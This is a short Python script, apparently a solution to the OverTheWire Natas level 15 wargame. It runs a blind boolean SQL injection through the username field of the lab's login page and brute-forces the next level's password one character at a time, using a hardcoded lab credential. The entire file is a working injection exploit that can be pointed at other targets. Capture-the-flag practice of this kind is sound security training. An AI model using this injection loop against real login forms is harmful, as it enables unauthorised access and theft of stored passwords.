import requests, string
from requests.auth import HTTPBasicAuth

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
	print("progress " + str(i) + " / 32")
	for c in chars:
		username = "natas16\" and binary substring(password, " + str(i) + ", 1) = '" + c + "'#"
		r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", data = {'username' : username}, auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))

		if "doesn" not in r.text:
			password += c
			print(password)
			break
		
print(password)
